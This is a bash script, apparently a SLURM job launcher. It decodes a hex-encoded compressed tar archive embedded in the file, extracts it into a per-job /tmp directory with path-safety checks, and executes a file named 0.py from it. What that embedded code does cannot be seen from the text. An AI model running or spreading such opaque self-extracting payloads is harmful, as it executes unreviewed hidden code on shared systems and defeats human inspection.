#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed95cf6fdb2014c77bf65f8172c196228c7f3ba972dc7d876d97a9aab08d63d2182c206bb369fffbc08eaa4c95766bbb69ef733060f3be0fdee3614a0e46c99b57853a4a4ae796be6c6996e5cffde57d5995d50da2afbbac8593b14c3b976fe1eb2fe4c7caaa072e575bb4620d4dd22c2fcaaadeacd66835b1f351b1eede0c2c2d4a3fa3ab689ea694567c531635cfaa84d1ba2968d3b0b6ef58d3a769bd29785a2779c9f3daf52aca9ab42ad2bccc4a5a5cab3667cb8d132db24d92d1c47f393279e58ce6b4a375d2d749cb5a4a1bd76bea9a667d97569b346fcbba6649976fdaa6e9bab44e735a147dc3abb2edba32cf8ad5cff78eedbf0025d3f9d57dfcb9fe93247951ff799e41fdbf05629c94b6c89ccddaff08d60333c351346b17945e1c79d06b35a28959ff125d267f74c340ef7c133a43c2f4fedbd7e42eba6d775e83f8fa3661a8634ce7bf0b8e88e6aee42d7fb26114056c31c5f1a4d581b7366ed5389ea4b0e7f87038f393dce3286ebfe2f966c2775ec6eebfe38019c39dfbcb12c97255846c119fef13a74e06fed4893d37ced56ee7547ebfc6f05df028ec802efb236ae23264116206d96d807aa5114742ce03247a2495459c483672e20f8a35de3ac44ab703d3ddfd90d01847db56492be4895fdb08e31d841172929810ec55e77d2f721199bcdc56336138fac28e27fe416ba543fc591ad6fb454c278b232739ed5c28271c2f86b793b7e4d292f1a1133a5c0666f7499ff89a3f0963efd5c33c8adcd4472d2cbf04c7129700cd5a3b2f8c2f59f109f149f4392642fa0887746dac0e67a7eeeb7c04ae364c0eeaf9288c4cc8c03f421d05ef7d9601000000000000000000000000000000000000000000e07fe517f6fef4ff00280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
